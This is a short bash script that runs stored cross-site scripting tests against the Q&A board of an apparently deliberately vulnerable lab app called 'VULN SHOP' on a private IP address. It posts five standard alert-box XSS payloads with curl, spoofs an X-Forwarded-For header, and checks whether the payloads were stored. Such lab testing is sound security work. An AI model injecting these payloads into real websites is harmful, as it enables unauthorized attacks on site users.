#!/bin/bash
# XSS (Cross-Site Scripting) Test Script
# Target: VULN SHOP Q&A Board

TARGET="http://10.210.136.53:3000"
MY_IP="10.0.0.101"

echo "[*] Stored XSS Test - Q&A Board"
echo "[*] Target: $TARGET/board"
echo ""

# Test various XSS payloads
payloads=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "<svg onload=alert('XSS')>"
    "<body onload=alert('XSS')>"
    "javascript:alert('XSS')"
)

for payload in "${payloads[@]}"; do
    echo "[*] Testing payload: $payload"

    response=$(curl -s -X POST \
        -H "X-Forwarded-For: $MY_IP" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --data-urlencode "content=$payload" \
        "$TARGET/board" -i 2>&1)

    if echo "$response" | grep -q "302"; then
        echo "[+] Payload submitted successfully"
    else
        echo "[-] Submission failed"
    fi
done

echo ""
echo "[*] Checking board for XSS payloads..."
curl -s -H "X-Forwarded-For: $MY_IP" "$TARGET/board" 2>&1 | grep -oP '<script>.*?</script>|<img[^>]*onerror[^>]*>' | head -5
